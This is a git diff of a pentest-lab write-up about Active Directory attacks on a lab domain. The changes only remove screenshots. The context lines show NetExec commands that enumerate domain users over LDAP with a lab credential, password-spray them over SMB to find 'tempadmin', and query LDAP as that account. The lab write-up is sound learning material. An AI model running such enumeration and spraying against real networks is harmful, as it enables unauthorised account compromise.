@@ -2,7 +2,6 @@
 
 First thing I did was too go through node connections in bloodhound, especially `SSUPPORT@PENTESTLAB.local` user I saw, which was part of privileged groups. It had `Generic` and `AllExtendedRights` type of privileges on OUs and Users.
 
-<img width="3456" height="1687" alt="Screenshot From 2026-06-24 19-27-57" src="https://github.com/user-attachments/assets/eca13e89-908d-4464-a163-c7c17a0e138d" />
 
 ---
 
@@ -28,7 +27,7 @@ nxc ldap 192.168.56.20 -u bh_intern -p 'User@2025!' --users
 nxc ldap 192.168.56.20 -u bh_intern -p 'User@2025!' --users | awk '/LDAP.*DC01/ {print $5}' | tee users.txt
 ```
 
-<img width="2833" height="1822" alt="Screenshot From 2026-06-24 19-35-47" src="https://github.com/user-attachments/assets/8451e0e9-6287-4ca1-956b-323d7143fbf9" />
+
 
 
 Explanation:
@@ -63,8 +62,6 @@ nxc smb 192.168.56.20 -u users.txt -p 'Password123' --continue-on-success
 
 ```
 
-<img width="3382" height="1351" alt="Screenshot From 2026-06-24 19-35-23" src="https://github.com/user-attachments/assets/ec981cc4-6894-4f36-b262-641c1fcdb6af" />
-
 Found User: `tempadmin`
 
 Explanation:
@@ -97,8 +94,6 @@ nxc ldap 192.168.56.20 -u 'tempadmin' -p 'Password123' --base-dn "DC=PENTESTLAB,
 
 ```
 
-
-<img width="2998" height="1591" alt="Screenshot From 2026-06-24 19-48-59" src="https://github.com/user-attachments/assets/7eeebda3-a649-441f-af80-a0c9d2db1eb3" />
 
 
 
